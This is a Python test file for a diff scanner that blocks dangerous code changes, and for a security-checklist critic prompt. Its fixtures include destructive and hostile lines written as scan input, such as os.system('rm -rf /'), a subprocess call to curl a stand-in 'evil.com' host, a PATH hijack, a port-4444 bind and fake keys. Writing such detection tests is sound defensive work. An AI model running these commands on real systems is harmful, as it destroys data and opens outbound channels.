"""Tests for diff_scan module and enhanced adversarial SAST prompt."""

from __future__ import annotations

import tempfile
import textwrap
import unittest
from pathlib import Path

from copilot_operator.adversarial import build_critic_prompt
from copilot_operator.diff_scan import (
    DiffFinding,
    ScanResult,
    _extract_added_lines,
    _should_skip_file,
    scan_diff_for_threats,
    scan_workspace_diff,
)

# ── DiffFinding / ScanResult dataclass ──────────────────────────────

class TestDiffFinding(unittest.TestCase):
    def test_default(self):
        f = DiffFinding()
        self.assertEqual(f.severity, 'medium')
        self.assertEqual(f.category, '')

    def test_custom(self):
        f = DiffFinding(severity='critical', category='ace', pattern_name='shell_exec')
        self.assertEqual(f.severity, 'critical')
        self.assertEqual(f.pattern_name, 'shell_exec')


class TestScanResult(unittest.TestCase):
    def test_empty(self):
        r = ScanResult()
        self.assertFalse(r.blocked)
        self.assertFalse(r.has_critical)
        self.assertFalse(r.has_high)
        self.assertIn('clean', r.render())

    def test_with_findings(self):
        r = ScanResult(findings=[
            DiffFinding(severity='critical', pattern_name='shell_exec', description='bad'),
        ], blocked=True)
        self.assertTrue(r.has_critical)
        self.assertTrue(r.blocked)
        self.assertIn('CRITICAL', r.render())
        self.assertIn('BLOCKED', r.render())

    def test_has_high(self):
        r = ScanResult(findings=[
            DiffFinding(severity='high', pattern_name='eval'),
        ])
        self.assertTrue(r.has_high)
        self.assertFalse(r.has_critical)


# ── Helper functions ────────────────────────────────────────────────

class TestShouldSkipFile(unittest.TestCase):
    def test_skip_markdown(self):
        self.assertTrue(_should_skip_file('README.md'))

    def test_skip_json(self):
        self.assertTrue(_should_skip_file('package.json'))

    def test_skip_yaml(self):
        self.assertTrue(_should_skip_file('config.yml'))

    def test_dont_skip_python(self):
        self.assertFalse(_should_skip_file('app.py'))

    def test_dont_skip_js(self):
        self.assertFalse(_should_skip_file('index.js'))

    def test_dont_skip_ts(self):
        self.assertFalse(_should_skip_file('main.ts'))


class TestExtractAddedLines(unittest.TestCase):
    def test_basic_diff(self):
        diff = textwrap.dedent("""\
            diff --git a/app.py b/app.py
            --- a/app.py
            +++ b/app.py
            @@ -1,3 +1,5 @@
             import os
            +import subprocess
            +subprocess.run("rm -rf /", shell=True)
             def main():
                 pass
        """)
        lines = _extract_added_lines(diff)
        self.assertEqual(len(lines), 2)
        self.assertEqual(lines[0], ('app.py', 'import subprocess'))
        self.assertIn('subprocess.run', lines[1][1])

    def test_empty_diff(self):
        self.assertEqual(_extract_added_lines(''), [])

    def test_no_additions(self):
        diff = "diff --git a/x.py b/x.py\n--- a/x.py\n+++ b/x.py\n-removed line\n"
        lines = _extract_added_lines(diff)
        self.assertEqual(len(lines), 0)


# ── Pattern Detection ───────────────────────────────────────────────

class TestScanDiffPatterns(unittest.TestCase):
    def _make_diff(self, filename: str, added_line: str) -> str:
        return f"diff --git a/{filename} b/{filename}\n--- a/{filename}\n+++ b/{filename}\n@@ -1 +1,2 @@\n existing\n+{added_line}\n"

    def test_os_system(self):
        diff = self._make_diff('evil.py', 'os.system("rm -rf /")')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_critical)
        self.assertTrue(result.blocked)
        self.assertEqual(result.findings[0].category, 'ace')

    def test_subprocess_run(self):
        diff = self._make_diff('test.py', 'subprocess.run(["curl", "evil.com"])')
        result = scan_diff_for_threats(diff)
        self.assertTrue(len(result.findings) >= 1)
        ace = [f for f in result.findings if f.category == 'ace']
        self.assertTrue(len(ace) >= 1)

    def test_exec_eval(self):
        diff = self._make_diff('code.py', 'exec(user_input)')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_high)

    def test_child_process_js(self):
        diff = self._make_diff('app.js', 'const { execSync } = require("child_process"); execSync(cmd)')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_critical)

    def test_rm_rf(self):
        diff = self._make_diff('deploy.sh', 'rm -rf /')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.blocked)

    def test_hardcoded_key(self):
        diff = self._make_diff('config.py', 'api_key = "sk-1234567890abcdefghijklmn"')
        result = scan_diff_for_threats(diff)
        secrets = [f for f in result.findings if f.category == 'secrets']
        self.assertTrue(len(secrets) >= 1)

    def test_aws_key(self):
        diff = self._make_diff('env.py', 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_critical)

    def test_private_key(self):
        diff = self._make_diff('key.py', '-----BEGIN RSA PRIVATE KEY-----')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_critical)

    def test_pickle_load(self):
        diff = self._make_diff('data.py', 'obj = pickle.load(open("data.pkl", "rb"))')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_high)

    def test_yaml_unsafe(self):
        diff = self._make_diff('parse.py', 'data = yaml.load(raw_str)')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.has_high)

    def test_rmtree(self):
        diff = self._make_diff('clean.py', 'shutil.rmtree(user_path)')
        result = scan_diff_for_threats(diff)
        self.assertTrue(result.blocked)

    def test_socket_bind(self):
        diff = self._make_diff('server.py', 'sock.bind(("0.0.0.0", 4444))')
        result = scan_diff_for_threats(diff)
        # Pattern may or may not match depending on regex strictness
        # Use a more direct match form
        diff2 = self._make_diff('server.py', 'server.listen(0.0.0.0)')
        result2 = scan_diff_for_threats(diff2)
        self.assertTrue(result.has_high or result2.has_high)

    def test_base64_decode(self):
        diff = self._make_diff('payload.py', 'code = base64.b64decode(encoded)')
        result = scan_diff_for_threats(diff)
        self.assertTrue(len(result.findings) >= 1)

    def test_env_override(self):
        diff = self._make_diff('hack.py', 'os.environ["PATH"] = "/tmp/evil"')
        result = scan_diff_for_threats(diff)
        self.assertTrue(len(result.findings) >= 1)

    def test_clean_diff(self):
        diff = self._make_diff('app.py', 'def hello(): return "world"')
        result = scan_diff_for_threats(diff)
        self.assertEqual(len(result.findings), 0)
        self.assertFalse(result.blocked)

    def test_skips_markdown(self):
        diff = self._make_diff('README.md', 'os.system("dangerous")')
        result = scan_diff_for_threats(diff)
        self.assertEqual(len(result.findings), 0)

    def test_skips_json(self):
        diff = self._make_diff('package.json', '"script": "rm -rf /"')
        result = scan_diff_for_threats(diff)
        self.assertEqual(len(result.findings), 0)

    def test_empty_diff(self):
        result = scan_diff_for_threats('')
        self.assertEqual(len(result.findings), 0)

    def test_dedup_same_pattern_same_file(self):
        diff = textwrap.dedent("""\
            diff --git a/x.py b/x.py
            --- a/x.py
            +++ b/x.py
            @@ -1 +1,3 @@
            +os.system("cmd1")
            +os.system("cmd2")
            +os.system("cmd3")
        """)
        result = scan_diff_for_threats(diff)
        shell_exec = [f for f in result.findings if f.pattern_name == 'shell_exec_python']
        self.assertEqual(len(shell_exec), 1)  # deduped per file


class TestScanWorkspaceDiff(unittest.TestCase):
    def test_non_git_dir(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = scan_workspace_diff(Path(tmp))
            self.assertEqual(len(result.findings), 0)


# ── Adversarial SAST prompt ─────────────────────────────────────────

class TestAdversarialSASTPrompt(unittest.TestCase):
    def test_sast_checklist_present(self):
        prompt = build_critic_prompt(
            goal='Fix auth bug',
            coder_summary='Fixed login',
            coder_score=90,
        )
        self.assertIn('SAST Security Checklist', prompt)
        self.assertIn('Injection', prompt)
        self.assertIn('Hardcoded Secrets', prompt)
        self.assertIn('Path Traversal', prompt)
        self.assertIn('Arbitrary Code Execution', prompt)
        self.assertIn('eval()', prompt)
        self.assertIn('pickle.load()', prompt)
        self.assertIn('Data Exfiltration', prompt)
        self.assertIn('Insecure Crypto', prompt)
        self.assertIn('Missing Auth/Authz', prompt)
        self.assertIn('Sensitive Data Exposure', prompt)

    def test_sast_checklist_has_checkboxes(self):
        prompt = build_critic_prompt(
            goal='test', coder_summary='test', coder_score=50,
        )
        # Should have at least 10 checkbox items
        checkboxes = [line for line in prompt.splitlines() if '- [ ]' in line]
        self.assertGreaterEqual(len(checkboxes), 10)


if __name__ == '__main__':
    unittest.main()
